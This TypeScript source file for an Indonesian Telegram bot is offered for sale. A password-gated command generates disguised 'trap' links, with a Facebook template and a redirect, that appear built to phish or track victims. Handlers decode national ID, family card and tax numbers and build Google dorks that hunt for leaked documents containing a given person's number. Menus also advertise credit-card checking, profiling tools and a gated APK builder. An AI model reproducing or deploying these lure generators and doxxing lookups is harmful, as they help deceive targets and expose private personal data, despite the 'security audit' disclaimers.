      const kb = Markup.inlineKeyboard([
        [Markup.button.callback('◀️ KEMBALI', 'menu_logger')]
      ]);
      ctx.editMessageText(msg, { parse_mode: 'HTML', ...kb }).catch(() => {});
    });

    bot.command('santopetrus', (ctx) => {
      const args = ctx.message.text.split(' ');
      if (args.length < 2 || args[1] !== '19281933') {
          return ctx.reply('🔒 <b>Akses Ditolak: Password SANTO_PETRUS salah atau tidak disertakan!</b>', {parse_mode: 'HTML'});
      }
      const template = args.length > 2 ? args[2] : 'facebook';
      const redirectUrl = args.length > 3 ? args[3] : 'https://google.com';
      
      const payload = Buffer.from(`${template}||${redirectUrl}||${ctx.from.id}`).toString('base64url');
      const trapUrl = `${appHost.replace(/\/$/, '')}/auth/santo-${payload}`;

      let msg = `💀 <b>SANTO_PETRUS V.1 GENERATED</b> 💀\n` +
                `━━━━━━━━━━━━━━━━━━━━\n` +
                `Tautan Tracker Berhasil di-generate:\n\n` +
                `📦 <b>TEMPLATE:</b> <code>${template}</code>\n` +
                `🌐 <b>REDIRECT:</b> <code>${redirectUrl}</code>\n\n` +
                `🔗 <b>LINK:</b>\n<code>${trapUrl}</code>\n\n` +
                `⚠️ <i>Perhatian: Gunakan hanya untuk Security Audit. Administrator memantau.</i>`;
      ctx.reply(msg, {parse_mode: 'HTML', link_preview_options: { is_disabled: true }});
    });

    bot.action('menu_osint_adv', (ctx) => {
      ctx.answerCbQuery().catch(() => {});
      const txt = `<b>📡 OSINT & GLOBAL RECON (ENTERPRISE)</b>\n` +
                  `━━━━━━━━━━━━━━━━━━━━\n` +
                  `Pusat intelijen dan pelacakan jejak digital. Semua perintah ada di bawah ini:\n\n` +
                  `🌐 <b>NETWORK & IP (ENTERPRISE AUDIT):</b>\n` +
                  `• /ip [IP_ADDR] - Deteksi ISP, Geo Info.\n` +
                  `• /domain [URL] - Detail DNS, Whois.\n` +
                  `• /subdomain [DOM] - Deteksi sub server terkait.\n` +
                  `• /reverseip [IP_DOM] - Web tetangga dlm server.\n` +
                  `• /traceroute [IP_DOM] - Routing MTR Hops.\n` +
                  `• /asn [ASN_IP] - BGP IP Network info.\n` +
                  `• /zonetransfer [DOM] - Audit AXFR DNS Server.\n` +
                  `• /httpheaders [DOM] - Deteksi WAF firewall.\n` +
                  `• /scan [IP_DOM] - Nmap Fast Scan/Port.\n` +
                  `• /shodan [IP] - Advanced Deep Network Scan.\n` +
                  `• /mac [MAC] - Cek Vendor Hardware.\n\n` +
                  `🕵️ <b>DIGITAL FOOTPRINT & LEAKS:</b>\n` +
                  `• /username [USER] - Footprint Tracker 150+ web.\n` +
                  `• /email [EMAIL] - Domain & provider Lookup.\n` +
                  `• /leak [EMAIL] - Data Compromise Check (Breach).\n` +
                  `• /github_user [USER] - Profiling Git Dev.\n` +
                  `• /dork [QUERY] - Google Dorking generator.\n\n` +
                  `💰 <b>FINANCIAL & SECURITY (ENTERPRISE):</b>\n` +
                  `• /bininfo [BIN] - Credit Card BIN Tracker.\n` +
                  `• /cc_check [CC] - Credit Card Luhn & Info.\n` +
                  `• /cve [KEYWORD] - Vulnerability Exploit Lookup.\n` +
                  `• /cname [DOMAIN] - DNS CNAME Mapping.\n` +
                  `• /txt [DOMAIN] - DNS TXT Verification.\n` +
                  `━━━━━━━━━━━━━━━━━━━━`;
      const kb = Markup.inlineKeyboard([
        [Markup.button.callback('🔍 OSINT INDO (Area Lokal)', 'menu_osint_indo')],
        [Markup.button.callback('◀️ KEMBALI', 'menu_main')]
      ]);
      ctx.editMessageText(txt, { parse_mode: 'HTML', ...kb }).catch(() => {});
    });

    bot.action('menu_osint_indo', (ctx) => {
      ctx.answerCbQuery().catch(() => {});
      const txt = `<b>🇮🇩 OSINT INDONESIA CENTER (ADVANCED ENTERPRISE 2.0)</b>\n` +
                  `━━━━━━━━━━━━━━━━━━━━\n` +
                  `Pusat pencarian dataset dan intelijen lokal tingkat lanjut (29 Fitur):\n\n` +
                  `📍 <b>CIVIL & APARATUR</b>\n` +
                  `• /nik [16-DIGIT] - OSINT Decode KTP\n` +
                  `• /kk [16-DIGIT] - Parse Kartu Keluarga\n` +
                  `• /paspor [NO-PASPOR] - Validasi Tipe & Format\n` +
                  `• /nip [18-DIGIT] - ASN/PNS Profiler & Decoder\n` +
                  `• /bpjs [NO] - BPJS Ketenagakerjaan/Kesehatan\n` +
                  `• /simkah [NAMA/NIK] - Kemenag Marriage Registry\n` +
                  `• /bansos [NAMA/NIK] - Kemensos DTKS & Bansos Profiler\n` +
                  `• /cekal [NAMA/PASPOR] - Imigrasi Interpol & Cekal Mapping\n\n` +
                  `💰 <b>FINANCIAL & LEGAL</b>\n` +
                  `• /npwp [15/16 DIGIT] - OSINT KPP & Kode NPWP\n` +
                  `• /nib [13-DIGIT] - Business Registry Validator\n` +
                  `• /ojk [NAMA] - Audit Pinjol & Fintech Legal\n` +
                  `• /rekening [NO-REK] - Investigasi Dork Fraud\n` +
                  `• /qris [PAYLOAD] - EMVCo Decoder Data QRIS\n` +
                  `• /bank_indo [NAMA] - Database Kode Bank & BI-FAST\n` +
                  `• /pbb [NOP] - Pajak Property & NJOP Tracker\n` +
                  `• /djki [MEREK] - DJKI HAKI & IP Checker\n` +
                  `• /ahu [NAMA PT] - AHU Kemenkumham Corporate Profiler\n\n` +
                  `📞 <b>VEHICLE, COMM & GOV INFRA</b>\n` +
                  `• /hlr [NOMOR] - Advanced Prefix Provider Lookup\n` +
                  `• /plat [NO-PLAT] - Cek Asal Wilayah Samsat Kendaraan\n` +
                  `• /bpkb [N0-BPKB] - Validasi Algoritma BPKB\n` +
                  `• /samsat [NOPOL] - E-Samsat & PKB Vehicle Tracker\n` +
                  `• /sertipikat [NOMOR] - Pertanahan ATR/BPN Dork\n` +
                  `• /kodepos [KECAMATAN] - API Region Directory & Dork Locator\n` +
                  `• /lpse [NAMA VENDOR] - OSINT E-Procurement Tender\n` +
                  `• /bpom [NAMA PRODUK] - Dorking BPOM Legal Validation\n` +
                  `• /bea_cukai [RESI/IMEI] - Kepabeanan & Cukai Mapping\n` +
                  `• /pse [NAMA APP] - PSE Kominfo Cyber Legitimacy Scanner\n` +
                  `• /gempa - Pemantauan Info Gempa BMKG API (NEW)\n\n` +
                  `🔎 <b>DEEP DORKING (Akademik, Hukum & Publik)</b>\n` +
                  `• /yudisium [NAMA/NIM] - API PDDikti & Publikasi Akademik\n` +
                  `• /sivil [PIN/IJAZAH] - SIVIL & PIN Kemdikbud Validator\n` +
                  `• /putusan [NAMA/KASUS] - Direktori MA / Hukum\n` +
                  `• /dpo [NAMA] - Database Buronan KPK/Polri\n` +
                  `• /kpu [NAMA/NIK] - DPT Pemerintahan Electoral\n` +
                  `• /nama [NAMA] - Indexer Publik\n` +
                  `━━━━━━━━━━━━━━━━━━━━`;
      const kb = Markup.inlineKeyboard([[Markup.button.callback('◀️ KEMBALI', 'menu_osint_adv')]]);
      ctx.editMessageText(txt, { parse_mode: 'HTML', ...kb }).catch(() => {});
    });

    bot.action('menu_games', (ctx) => {
      ctx.answerCbQuery().catch(() => {});
      const txt = `<b>🎮 COMPLEX MINI GAMES SET (20+ Games)</b>\n` +
                  `━━━━━━━━━━━━━━━━━━━━\n` +
                  `<b>[CASINO & RNG]</b>\n` +
                  `• /roulette - Russian Roulette (Adrenalin!)\n` +
                  `• /dadu - Roll Multiple Dice.\n` +
                  `• /kartu - Draw a random deck card.\n` +
                  `• /coinflip - Heads or Tails.\n` +
                  `• /flip - Text flip.\n\n` +
                  `<b>[TEBAK-TEBAKAN LOGIKA]</b>\n` +
                  `• /tebakangka - Tebak Angka Sulit (1-100)\n` +
                  `• /tebaknegara - Guess the flag.\n` +
                  `• /tebakkata - Hangman Style Indonesia.\n` +
                  `• /tebakhewan - Clue based animal guessing.\n` +
                  `• /susunkata - Scrambled words.\n` +
                  `• /math - Advanced Fast Math quiz.\n` +
                  `• /morse - Morse Decode Quiz.\n\n` +
                  `<b>[PREDIKSI & MISTIK]</b>\n` +
                  `• /khodam [NAMA] - Cek khodam.\n` +
                  `• /ramal [NAMA] - AI Prediction (Future).\n` +
                  `• /jodoh [NAMA] [NAMA2] - Love calculator.\n` +
                  `• /tarot - 3 Card Reading Spiritual.\n` +
                  `• /8ball [TANYA] - Magic 8 ball oracle.\n\n` +
                  `<b>[SOSIAL & LAINNYA]</b>\n` +
                  `• /suit - Gunting Batu Kertas.\n` +
                  `• /werewolf - Multi-scenario simulation AI.\n` +
                  `• /tod - Truth or Dare randomizer.\n` +
                  `• /gombal - Flirting AI Generator.\n` +
                  `• /doa - Random Doa Islam.\n` +
                  `• /joke - Random Dark Joke.\n` +
                  `• /meme - Fetch Meme.\n` +
                  `• /fact - Useless Facts.\n` +
                  `━━━━━━━━━━━━━━━━━━━━`;
      const kb = Markup.inlineKeyboard([[Markup.button.callback('◀️ KEMBALI', 'menu_main')]]);
      ctx.editMessageText(txt, { parse_mode: 'HTML', ...kb }).catch(() => {});
    });

    bot.action('menu_tools', (ctx) => {
      ctx.answerCbQuery().catch(() => {});
      const txt = `<b>🛠️ ADVANCED UTILITY TOOLS</b>\n` +
                  `━━━━━━━━━━━━━━━━━━━━\n` +
                  `Kumpulan alat enkripsi, formatter, utility IT complex:\n\n` +
                  `🔐 <b>CRYPTOGRAPHY:</b>\n` +
                  `• /b64enc [TEKS] - Base64 Encoder.\n` +
                  `• /b64dec [TEKS] - Base64 Decoder.\n` +
                  `• /hash [TEKS] - MD5 Hashing.\n` +
                  `• /sha256 [TEKS] - SHA-256 Hashing secure.\n` +
                  `• /pwd [LENGTH] - Random Strong PW Gen.\n` +
                  `• /uuid - Generate UUID V4.\n\n` +
                  `📲 <b>SYSTEMS / COMPILERS:</b>\n` +
                  `• /mikkoapk [sandi] [paket] [judul] - Compile Blank APK.\n\n` +
                  `🌐 <b>WEB TOOLS:</b>\n` +
                  `• /qr [URL] - HD QR Code Gen.\n` +
                  `• /shortlink [URL] - TinyURL Generator.\n` +
                  `• /port [PORT] - Cek deskripsi service port.\n` +
                  `• /xss [URL] - XSS Vuln Scanner (Bug Hunter).\n\n` +
                  `📊 <b>DATA / API UTILS:</b>\n` +
                  `• /weather [KOTA] - Info Cuaca API.\n` +
                  `• /crypto_price [COIN] - WebScrape Harga Kripto.\n` +
                  `• /github [USER] - Fetch GH Stats.\n` +
                  `━━━━━━━━━━━━━━━━━━━━`;
      const kb = Markup.inlineKeyboard([
        [Markup.button.callback('📲 MikkoAPK Compiler', 'menu_mikkoapk')],
        [Markup.button.callback('◀️ KEMBALI', 'menu_main')]
      ]);
      ctx.editMessageText(txt, { parse_mode: 'HTML', ...kb }).catch(() => {});
    });

    bot.action('menu_mikkoapk', (ctx) => {
      ctx.answerCbQuery().catch(() => {});
      const txt = `📲 <b>MIKKO_APK COMPILER GUIDE</b> 📲\n` +
                  `━━━━━━━━━━━━━━━━━━━━\n` +
                  `Alat ini merakit template file APK kosong untuk analisa struktur Android binary, verifikasi tanda tangan digital, dan general education.\n\n` +
                  `<b>Sandi Akses:</b> <code>[Terproteksi / Hubungi Owner]</code>\n\n` +
                  `<b>Cara Penggunaan Perintah:</b>\n` +
                  `<code>/mikkoapk [sandi_akses] [nama.paket] [Judul App]</code>\n\n` +
                  `<b>Contoh Kasus:</b>\n` +
                  `<code>/mikkoapk [sandi_akses] com.mikko.blank BelajarApp</code>\n\n` +
                  `━━━━━━━━━━━━━━━━━━━━\n` +
                  `<i>Gunakan APK hasil rilis compiler dengan bijak untuk pembelajaran forensik.</i>`;
      const kb = Markup.inlineKeyboard([[Markup.button.callback('◀️ KEMBALI KUTOOLS', 'menu_tools')]]);
      ctx.editMessageText(txt, { parse_mode: 'HTML', ...kb }).catch(() => {});
    });

    bot.action('menu_media', (ctx) => {
      ctx.answerCbQuery().catch(() => {});
      const txt = `<b>🎵 Media Downloader</b>\n` +
                  `• /lagu [Search Query]\n` +
                  `• /play [Search Query]\n`;
      const kb = Markup.inlineKeyboard([[Markup.button.callback('◀️ KEMBALI', 'menu_main')]]);
      ctx.editMessageText(txt, { parse_mode: 'HTML', ...kb }).catch(() => {});
    });

    bot.action('menu_alarm', (ctx) => {
      ctx.answerCbQuery().catch(() => {});
      const txt = `<b>⏰ Alarm System</b>\n` +
                  `• /alarm [Menit]\n` +
                  `• /listalarm\n`;
      const kb = Markup.inlineKeyboard([[Markup.button.callback('◀️ KEMBALI', 'menu_main')]]);
      ctx.editMessageText(txt, { parse_mode: 'HTML', ...kb }).catch(() => {});
    });

    bot.action('menu_buy_bot', (ctx) => {
      ctx.answerCbQuery().catch(() => {});
      const targetTxt = `🛒 <b>PEMBELIAN BOT (EA - ENUMA ELLISH)</b>\n` +
                  `━━━━━━━━━━━━━━━━━━━━\n` +
                  `Sistem Bot Telegram canggih ini mengusung protokol <b>EA - Enuma Ellish</b>.\n\n` +
                  `<b>INFORMASI PENTING:</b>\n` +
                  `• Beroperasi di atas Standard Operating Procedure (SOP) dan syarat teknis yang sangat ketat.\n` +
                  `• Kualitas terjamin tanpa cacat (No Bug / Golden Rules Guarantee).\n` +
                  `• Server Handal 24/7 dan Response Cepat.\n\n` +
                  `💰 <b>H A R G A:</b>\n` +
                  `<b>Rp 500.000,- (Lima Ratus Ribu Rupiah)</b>\n\n` +
                  `Jika Anda berminat untuk memiliki bot serbaguna dengan spesifikasi ini, silakan hubungi Owner.\n` +
                  `━━━━━━━━━━━━━━━━━━━━`;
      const kb = Markup.inlineKeyboard([[Markup.button.callback('◀️ KEMBALI', 'menu_main')]]);
      ctx.editMessageText(targetTxt, { parse_mode: 'HTML', ...kb }).catch(() => {});
    });

    bot.action('menu_help', (ctx) => {
      ctx.answerCbQuery().catch(() => {});
      const txt = `<b>ℹ️ ɪɴꜰᴏʀᴍᴀꜱɪ & ᴘᴇʀᴊᴀɴᴊɪᴀɴ ᴘᴇɴɢɢᴜɴᴀ</b>\n` +
                  `━━━━━━━━━━━━━━━━━━━━\n` +
                  `ʜᴏꜱᴛ: <code>${appHost}</code>\n` +
                  `ꜱᴛᴀᴛᴜꜱ: 🟢 ᴏɴʟɪɴᴇ\n\n` +
                  `<b>📜 ᴘᴏʟɪꜱɪ ᴋᴇᴀᴍᴀɴᴀɴ (USER AGREEMENT):</b>\n` +
                  `Sistem mendeteksi verifikasi identitas untuk perlindungan sesi.\n\n` +
                  `1. Pengguna menyatakan mematuhi seluruh aturan platform.\n` +
                  `2. Semua akses audit sistem disetujui.\n` +
                  `3. Sistem beroperasi di bawah otoritas penuh.\n` +
                  `━━━━━━━━━━━━━━━━━━━━`;
      const kb = Markup.inlineKeyboard([[Markup.button.callback('◀️ KEMBALI', 'menu_main')]]);
      ctx.editMessageText(txt, { parse_mode: 'HTML', ...kb }).catch(() => {});
    });

    bot.command('nik', (ctx) => {
      const args = ctx.message.text.split(' ');
      if (args.length < 2) return ctx.reply("⚠️ Format salah. Contoh: /nik 3201010101900001");
      const nik = args[1].replace(/[^0-9]/g, '');

      if (nik.length !== 16) {
        return ctx.reply("❌ Sistem Menolak: NIK E-KTP wajib memiliki panjang 16 digit numerik.");
      }

      try {
        const parsed = nikParser(nik);
        const PROVINCES: Record<string, string> = {'11':'Aceh','12':'Sumatera Utara','13':'Sumatera Barat','14':'Riau','15':'Jambi','16':'Sumatera Selatan','17':'Bengkulu','18':'Lampung','19':'Kep. Bangka Belitung','21':'Kep. Riau','31':'DKI Jakarta','32':'Jawa Barat','33':'Jawa Tengah','34':'DI Yogyakarta','35':'Jawa Timur','36':'Banten','51':'Bali','52':'Nusa Tenggara Barat','53':'Nusa Tenggara Timur','61':'Kalimantan Barat','62':'Kalimantan Tengah','63':'Kalimantan Selatan','64':'Kalimantan Timur','65':'Kalimantan Utara','71':'Sulawesi Utara','72':'Sulawesi Tengah','73':'Sulawesi Selatan','74':'Sulawesi Tenggara','75':'Gorontalo','76':'Sulawesi Barat','81':'Maluku','82':'Maluku Utara','91':'Papua Barat','94':'Papua'};
        const provName = PROVINCES[nik.substring(0,2)] || parsed.province() || 'Unknown / Pemekaran Baru';
        const jkStr = parsed.kelamin() === 'pria' ? 'LAKI-LAKI 👱‍♂️' : parsed.kelamin() === 'wanita' ? 'PEREMPUAN 👩' : 'TIDAK TERDETEKSI 👤';
        
        let bornDateStr = 'Tidak Valid';
        let isDateValid = false;
        try {
          const d = parsed.lahir();
          if (d) {
            const bornDate = d instanceof Date ? d : new Date(d);
            if (!isNaN(bornDate.getTime())) {
              const day = String(bornDate.getDate()).padStart(2, '0');
              const month = String(bornDate.getMonth() + 1).padStart(2, '0');
              const year = bornDate.getFullYear();
              bornDateStr = `${day}-${month}-${year}`;
              isDateValid = true;
            }
          }
        } catch (err) {}

        let prov = provName;
        let kab = "N/A (Cek Database SIAK)";
        let kec = "N/A (Cek Database SIAK)";
        let pos = "N/A";
        
        try { if (parsed.kabupatenKota()) kab = parsed.kabupatenKota(); } catch(e){}
        try { if (parsed.kecamatan()) kec = parsed.kecamatan(); } catch(e){}
        try { if (parsed.kodepos()) pos = String(parsed.kodepos()); } catch(e){}

        const dork1 = encodeURIComponent(`"${nik}" ext:pdf OR ext:xls OR ext:xlsx OR ext:csv`);
        const dork2 = encodeURIComponent(`"${nik}" site:scribd.com OR site:academia.edu OR site:pddikti.kemdikbud.go.id`);
        const dork3 = encodeURIComponent(`"DPT" "${nik}"`);

        const reply = `<b>🇮🇩 CIVIL IDENTITY DECODER (KTP/NIK)</b>\n` +
                      `━━━━━━━━━━━━━━━━━━━━\n` +
                      `📋 <b>NOMOR INDUK KEPENDUDUKAN:</b> <code>${nik}</code>\n\n` +
                      `<b>[1] 🧬 ANALISIS PERSONAL:</b>\n` +
                      `├ <b>Jenis Kelamin:</b> ${jkStr}\n` +
                      `├ <b>Tanggal Lahir:</b> <code>${bornDateStr}</code>\n` +
                      `└ <b>Integrasi Tgl:</b> ${isDateValid ? '✅ Sinkron' : '❌ Anomali Waktu'}\n\n` +
                      `<b>[2] 📍 GEOLOKASI (Basis Alokasi SIAK):</b>\n` +
                      `├ <b>Provinsi:</b> ${prov}\n` +
                      `├ <b>Kab/Kota:</b> ${kab}\n` +
                      `├ <b>Kecamatan:</b> ${kec}\n` +
                      `└ <b>Kode Pos (Estimasi):</b> <code>${pos}</code>\n\n` +
                      `<b>[3] 🔢 TEKNIKAL & REGISTRASI:</b>\n` +
                      `├ <b>Nomor Urut Sistem:</b> <code>${nik.substring(12, 16)}</code>\n` +
                      `└ <b>Integritas Pola:</b> ${parsed.isValid() ? '✅ VALID (Terstruktur Dukcapil)' : '⚠️ CACAT (Kemungkinan Generate / Salah Ketik)'}\n\n` +
                      `<b>[4] 🔎 DEEP DORK INVESTIGATION:</b>\n` +
                      `• <a href="https://www.google.com/search?q=${dork1}">Lacak Kebocoran Dokumen Publik Terindeks (PDF/Excel)</a>\n` +
                      `• <a href="https://www.google.com/search?q=${dork2}">Tracer Jejak Institusi & Akademik Publik (Kampus)</a>\n` +
                      `• <a href="https://www.google.com/search?q=${dork3}">Investigasi Rekam DPT Pemilu (Jika Terindeks)</a>\n` +
                      `━━━━━━━━━━━━━━━━━━━━\n` +
                      `<i>⚠️ Modul Enterprise: Menganalisis metadata tanpa rekaman langsung API Pusat Dukcapil Kemendagri.</i>`;
        ctx.reply(reply, { parse_mode: 'HTML', link_preview_options: { is_disabled: true } });
      } catch (e) {
        ctx.reply("❌ Gagal mengurai NIK. Sistem tidak mengenali format.");
      }
    });

    bot.command('plat', (ctx) => {
      const args = ctx.message.text.split(' ');
      if (args.length < 2) return ctx.reply("⚠️ Format salah. Contoh: /plat B 1234 ABC atau /plat B1234ABC");
      
      const platInput = args.slice(1).join('').toUpperCase();
      const match = platInput.match(/^([A-Z]{1,2})(\d{1,4})([A-Z]{0,3})$/);
      
      if (!match) return ctx.reply("❌ Format plat nomor tidak valid / tidak mengikuti standar Polri.");
      
      const platMap: Record<string, string> = { "A": "Banten", "B": "DKI Jakarta, Depok, Tangerang, Bekasi", "D": "Bandung, Cimahi", "E": "Cirebon, Indramayu, Majalengka, Kuningan", "F": "Bogor, Sukabumi, Cianjur", "T": "Purwakarta, Karawang, Subang", "Z": "Garut, Tasikmalaya, Sumedang, Ciamis, Banjar", "G": "Pekalongan, Tegal, Brebes, Batang, Pemalang", "H": "Semarang", "DN": "Sulawesi Tengah", "DT": "Sulawesi Tenggara", "DD": "Makassar, Gowa, Maros", "DP": "Parepare, Palopo, Luwu", "DC": "Sulawesi Barat", "PA": "Papua", "PB": "Papua Barat", "BL": "Aceh", "BB": "Sumatera Utara (Pantai Barat)", "BK": "Sumatera Utara (Pantai Timur)/Medan", "BA": "Sumatera Barat", "BM": "Riau", "BP": "Kepulauan Riau", "BG": "Sumatera Selatan", "BN": "Bangka Belitung", "BE": "Lampung", "BD": "Bengkulu", "BH": "Jambi", "AB": "DI Yogyakarta", "AD": "Surakarta", "K": "Pati", "R": "Banyumas", "L": "Surabaya", "M": "Madura", "N": "Malang", "P": "Besuki", "S": "Bojonegoro", "W": "Sidoarjo", "DK": "Bali", "DR": "Lombok", "EA": "Sumbawa", "DH": "Timor", "EB": "Flores", "ED": "Sumba", "KB": "Kalimantan Barat", "DA": "Kalimantan Selatan", "KT": "Kalimantan Timur", "KU": "Kalimantan Utara", "DB": "Sulawesi Utara (Daratan)", "DL": "Sulawesi Utara (Kepulauan)", "DE": "Maluku", "DG": "Maluku Utara" };

      const kodeWilayah = match[1];
      const angka = match[2];
      const kodeDetail = match[3];

      const wilayah = platMap[kodeWilayah] || "🚨 Wilayah (Region) Tidak Terdaftar / Khusus CD/CC";
      
      const dorkBapenda = encodeURIComponent(`"Samsat" OR "Pajak Kendaraan" "${platInput}"`);
      const dorkLelang = encodeURIComponent(`"Lelang" OR "Tarikan" "${platInput}" -motor`);
      

      const reply = `<b>🚗 VEHICLE LICENSE ANALYZER (TNKB POLRI)</b>\n` +
                    `━━━━━━━━━━━━━━━━━━━━\n` +
                    `🔢 <b>NOMOR POLISI:</b> <code>${kodeWilayah} ${angka} ${kodeDetail}</code>\n\n` +
                    `<b>[1] 📍 ALOKASI REGIONAL:</b>\n` +
                    `└ <b>Zona:</b> ${wilayah}\n\n` +
                    `<b>[2] 🧬 STRUKTUR DECODE:</b>\n` +
                    `├ <b>Kode Wilayah/Residen:</b> ${kodeWilayah}\n` +
                    `├ <b>Nomor Urut Pendaftaran:</b> ${angka}\n` +
                    `└ <b>Huruf Mutasi/Seri:</b> ${kodeDetail || '(Kosong/Pemerintah)'}\n\n` +
                    `<b>[3] 🔎 DEEP DORK INVESTIGASI (Open Source):</b>\n` +
                    `• <a href="https://www.google.com/search?q=${dorkBapenda}">Cari Berkas Pajak / Info Bapenda Terbuka</a>\n` +
                    `• <a href="https://www.google.com/search?q=${dorkLelang}">Caci Database Lelang / Tarikan Leasing Mobil</a>\n` +
                    `━━━━━━━━━━━━━━━━━━━━\n` +
                    `<i>⚠️ Hasil identifikasi mencerminkan pengelompokan korlantas regional dasar, bukan hit API instansi terkait pajak kendaraan (Bapenda).</i>`;

      ctx.reply(reply, { parse_mode: 'HTML', link_preview_options: { is_disabled: true } });
    });

    bot.command('kk', (ctx) => {
      const args = ctx.message.text.split(' ');
      if (args.length < 2) return ctx.reply("⚠️ Format: /kk [16-digit No KK]");
      const kk = args[1].replace(/[^0-9]/g, '');
      if (kk.length !== 16) return ctx.reply("❌ Sistem Menolak: Nomor Kartu Keluarga harus terdiri dari 16 digit numerik.");
      
      const provStr = kk.substring(0, 2);
      const PROVINCES: Record<string, string> = {'11':'Aceh','12':'Sumatera Utara','13':'Sumatera Barat','14':'Riau','15':'Jambi','16':'Sumatera Selatan','17':'Bengkulu','18':'Lampung','19':'Kep. Bangka Belitung','21':'Kep. Riau','31':'DKI Jakarta','32':'Jawa Barat','33':'Jawa Tengah','34':'DI Yogyakarta','35':'Jawa Timur','36':'Banten','51':'Bali','52':'Nusa Tenggara Barat','53':'Nusa Tenggara Timur','61':'Kalimantan Barat','62':'Kalimantan Tengah','63':'Kalimantan Selatan','64':'Kalimantan Timur','65':'Kalimantan Utara','71':'Sulawesi Utara','72':'Sulawesi Tengah','73':'Sulawesi Selatan','74':'Sulawesi Tenggara','75':'Gorontalo','76':'Sulawesi Barat','81':'Maluku','82':'Maluku Utara','91':'Papua Barat','94':'Papua'};
      const provName = PROVINCES[provStr] || 'Unknown / Pemekaran Baru';
      const dd = kk.substring(6, 8);
      const mm = kk.substring(8, 10);
      const yy = kk.substring(10, 12);
      
      const dork1 = encodeURIComponent(`"${kk}" ext:pdf OR ext:xls OR ext:xlsx`);
      
      const reply = `<b>🧑‍👩‍👧‍👦 OSINT KARTU KELUARGA (FAMILY CARD)</b>\n━━━━━━━━━━━━━━━━━━━━\n` +
                    `📋 <b>NOMOR KK (NO KA):</b> <code>${kk}</code>\n\n` + 
                    `<b>[1] 📍 ALOKASI PENERBITAN (Geolokasi):</b>\n` +
                    `├ <b>Provinsi Dasar:</b> ${provName} (Kode: ${provStr})\n` +
                    `├ <b>Sandi Kab/Kota:</b> ${kk.substring(2, 4)}\n` +
                    `└ <b>Sandi Kecamatan:</b> ${kk.substring(4, 6)}\n\n` +
                    `<b>[2] 📅 INDIKASI LOG CETAK / UPDATE KELUARGA:</b>\n` +
                    `└ <b>Tanggal / Bulan / Tahun:</b> <code>${dd}-${mm}-20${yy}</code>\n\n` +
                    `<b>[3] 🔢 TEKNIKAL & URUTAN SISTEM:</b>\n` +
                    `└ <b>No Urut Algoritma:</b> <code>${kk.substring(12, 16)}</code>\n\n` +
                    `<b>[4] 🔎 DEEP DORK INVESTIGASI (Open Source):</b>\n` +
                    `• <a href="https://www.google.com/search?q=${dork1}">Scan Kebocoran Dokumen Sensitif Instansi/BLT</a>\n` +
                    `━━━━━━━━━━━━━━━━━━━━\n<i>⚠️ Data murni hasil ekstraksi pola baku registrasi Kependudukan Dirjen Dukcapil RI.</i>`;
      ctx.reply(reply, { parse_mode: 'HTML', link_preview_options: { is_disabled: true } });
    });

    bot.command('npwp', (ctx) => {
      const args = ctx.message.text.split(' ');
      if (args.length < 2) return ctx.reply("⚠️ Format: /npwp [Nomor NPWP 15/16 Digit]");
      let npwp = args[1].replace(/[^0-9]/g, '');
      if (npwp.length !== 15 && npwp.length !== 16) return ctx.reply("❌ Penolakan Sistem: NPWP Orisinal harus mencakup struktur panjang 15 digit format lama atau 16 digit format NIK baru.");
      
      const idWp = npwp.substring(0, 1);
      let jenisWp = "Unknown Classification / Not Standard";
      if (['0','1','2','3'].includes(idWp)) jenisWp = "🏢 BADAN USAHA / KORPORASI / INSTANSI BENDARA";
      if (['4','5','6'].includes(idWp)) jenisWp = "💼 PENGUSAHA / PRIBADI NON-KARYAWAN";
      if (['7','8','9'].includes(idWp)) jenisWp = "🧑 PRIBADI KARYAWAN / PEGAWAI";
      
      const kpp = npwp.substring(9, 12);
      const kpdjn = npwp.substring(2, 5); // 3 digit kode pajak
      const cabang = npwp.substring(12, 15);
      
      const formatNpwp = npwp.length === 15 ? 
        `${npwp.substring(0,2)}.${npwp.substring(2,5)}.${npwp.substring(5,8)}.${npwp.substring(8,9)}-${npwp.substring(9,12)}.${npwp.substring(12,15)}` : npwp;
      
      let kppInfo = "Kode KPP Standard"; // Could be dynamically mapped, but we'll leave it as a general identifier string
      if (kpp.startsWith('0')) kppInfo = "Wilayah KPP Khusus/PMA/Besar Pusat";
      else kppInfo = "Wilayah KPP Pratama / Madya Daerah";

      const dork1 = encodeURIComponent(`"${npwp.length === 15 ? formatNpwp : npwp}" ext:pdf OR ext:xls`);

      const reply = `<b>💳 TAX IDENTITY ANALYZER (NPWP)</b>\n━━━━━━━━━━━━━━━━━━━━\n` +
                    `📋 <b>NOMOR POKOK WAJIB PAJAK:</b> <code>${formatNpwp}</code>\n\n` +
                    `<b>[1] 👤 KLASIFIKASI KATEGORI TARGET:</b>\n└ ${jenisWp}\n\n` +
                    `<b>[2] 🏢 IDENTIFIKATOR ADMINISTRASI INSTANSI:</b>\n` +
                    `├ <b>KPP (Kantor Pelayanan Pajak):</b> <code>${kpp}</code> (${kppInfo})\n` +
                    `├ <b>Kode Wilayah/Sandi KPP:</b> <code>${kpdjn}</code>\n` +
                    `└ <b>Status Entitas:</b> ${cabang === '000' ? '🏬 Kantor Pusat (Status: 000)' : '🏢 Kantor Cabang (Status: '+cabang+')'}\n\n` +
                    `<b>[3] 🔎 DEEP DORK INVESTIGASI:</b>\n` +
                    `• <a href="https://www.google.com/search?q=${dork1}">Lacak Kebocoran Berkas Faktur Pajak/Rekening Publik (PDF/Excel)</a>\n` +
                    `━━━━━━━━━━━━━━━━━━━━\n<i>⚠️ Informasi berdasarkan algoritma serialisasi Ditjen Pajak Kemenkeu Republik Indonesia.</i>`;
      ctx.reply(reply, { parse_mode: 'HTML', link_preview_options: { is_disabled: true } });
    });

    bot.command('qris', (ctx) => {
      const payload = ctx.message.text.substring(6).trim();
      if (!payload) return ctx.reply("⚠️ Format: /qris [Teks Kode QRIS dari Scanner]");
      
      let merchantName = "N/A / Encrypted";
      let merchantCity = "N/A / Encrypted";
      let merchantCategoryCode = "N/A";
      let merchantCriteria = "N/A";
      let currencyCode = "N/A";
      let initMethod = "N/A";
      let amountStr = "Fleksibel (Input User)";
      
      try {
        let i = 0;
        let p = payload;
        while(i < p.length) {
          if (p.length - i < 4) break;
          const tag = p.substring(i, i+2);
          const len = parseInt(p.substring(i+2, i+4));
          const val = p.substring(i+4, i+4+len);
          
          if (tag === '01') initMethod = val === '11' ? 'Statis (Cetak)' : val === '12' ? 'Dinamis (Mesin EDC / App)' : val;
          if (tag === '52') merchantCategoryCode = val;
          if (tag === '53') currencyCode = val === '360' ? 'IDR (Rupiah Indonesia)' : val;
